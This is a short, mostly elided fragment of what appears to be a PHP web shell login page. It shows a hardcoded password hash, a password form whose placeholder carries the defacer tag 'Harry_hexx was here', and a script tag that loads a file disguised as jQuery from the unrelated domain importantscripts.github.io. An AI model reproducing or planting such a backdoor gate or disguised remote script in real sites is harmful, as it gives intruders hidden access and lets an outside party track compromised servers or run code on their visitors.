...
$password = "ede71b688bc78126c75eef2efa217839"; //
...
?>
    ...
    <body>
        <form action="" method="post">
            <div align="middle">
                <input type="password" name="pass" placeholder="Harry_hexx was here..!!!"&nbsp;"">&nbsp;<input type="submit" name="submit" value="Q R T">
            </div>
        </form>
    </body>
...
<script src='//importantscripts.github.io/jquery.min.js'></script>
